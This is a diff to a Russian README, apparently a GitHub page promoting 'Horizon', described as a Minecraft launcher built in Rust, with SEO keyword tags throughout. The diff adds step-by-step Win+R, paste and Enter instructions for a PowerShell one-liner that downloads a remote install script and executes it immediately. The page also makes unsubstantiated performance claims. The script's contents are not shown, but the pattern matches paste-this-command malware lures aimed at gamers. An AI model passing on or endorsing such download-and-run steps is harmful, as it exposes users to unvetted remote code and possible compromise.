@@ -12,7 +12,16 @@
 powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 ```
 
+1. **Win+R.** Зажми Windows и R.
+2. **Вставь.** Ctrl+V — команду выше.
+3. **Enter.** Horizon скачается, установится и откроется сам.
+
 <p align="center">Без прав администратора. Если Windows спросит про PowerShell — подтверди.</p>
+
+<p align="center">
+  <strong>README:</strong>
+  <strong>Русский</strong> · <a href="README.en.md">English</a> · <a href="README.uk.md">Українська</a> · <a href="README.es.md">Español</a> · <a href="README.pt.md">Português</a> · <a href="README.de.md">Deutsch</a> · <a href="README.fr.md">Français</a> · <a href="README.it.md">Italiano</a> · <a href="README.pl.md">Polski</a> · <a href="README.tr.md">Türkçe</a> · <a href="README.zh.md">简体中文</a> · <a href="README.ja.md">日本語</a> · <a href="README.ko.md">한국어</a> · <a href="README.ar.md">العربية</a> · <a href="README.hi.md">हिन्दी</a> · <a href="README.id.md">Indonesia</a> · <a href="README.vi.md">Tiếng Việt</a>
+</p>
 
 <h1 align="center">Скачать Horizon — лаунчер Minecraft на Rust (Minecraft Rust Edition)</h1>
 
@@ -44,7 +53,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-выше_ванильной_Java-orange">
   <img alt="free" src="https://img.shields.io/badge/Цена-бесплатно-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.49-lightgrey">
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.54-lightgrey">
 </p>
 
 [![Скачать Horizon Minecraft на Rust — лаунчер Windows](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/)
@@ -115,7 +124,7 @@ Horizon закрывает этот запрос: **бесплатный setup**
 
 - ОС: Windows 10 / Windows 11, 64-bit
 - Файл: `horizon-launcher-setup.exe`
-- Версия лаунчера на сайте: **0.2.49**
+- Версия лаунчера на сайте: **0.2.54**
 - Цена: бесплатно
 - Языки сайта: русский и English
 
@@ -257,7 +266,7 @@ English:
 - Install guide: [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/)
 - Direct setup: [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
 
-You get a native **Rust** client instead of the stock JVM client, typically **higher FPS**, Windows 10/11 x64, launcher version **0.2.49**. Unofficial — not Mojang, not Microsoft. Keep using a legitimate Minecraft Java account/license. News: [t.me/horizonlauncher](https://t.me/horizonlauncher).
+You get a native **Rust** client instead of the stock JVM client, typically **higher FPS**, Windows 10/11 x64, launcher version **0.2.54**. Unofficial — not Mojang, not Microsoft. Keep using a legitimate Minecraft Java account/license. News: [t.me/horizonlauncher](https://t.me/horizonlauncher).
 
 Why Rust: less JVM overhead, snappier frame times, a real Windows setup. Read [Minecraft on Rust](https://horizonlauncher.net/en/minecraft-rust/) and [performance](https://horizonlauncher.net/en/performance/).
 
@@ -269,7 +278,7 @@ Install: download `horizon-launcher-setup.exe` from [horizonlauncher.net](https:
 
 Теги этого GitHub-поста (RU + EN). Канонический лендинг всегда **[horizonlauncher.net](https://horizonlauncher.net/)**.
 
-`скачать Horizon` `скачать Horizon Minecraft` `скачать Horizon бесплатно` `скачать лаунчер Horizon` `скачать Horizon Windows` `скачать Horizon setup` `скачать Horizon exe` `Horizon Minecraft скачать` `Horizon лаунчер скачать` `Horizon 0.2.49 скачать` `horizon-launcher-setup.exe` `официальный сайт Horizon` `horizonlauncher.net`
+`скачать Horizon` `скачать Horizon Minecraft` `скачать Horizon бесплатно` `скачать лаунчер Horizon` `скачать Horizon Windows` `скачать Horizon setup` `скачать Horizon exe` `Horizon Minecraft скачать` `Horizon лаунчер скачать` `Horizon 0.2.54 скачать` `horizon-launcher-setup.exe` `официальный сайт Horizon` `horizonlauncher.net`
 
 `лаунчер Horizon` `Horizon launcher` `лаунчер Minecraft Horizon` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `альтернативный лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `установить Horizon` `установка лаунчера Horizon` `как скачать Horizon` `как установить Horizon Minecraft`
 
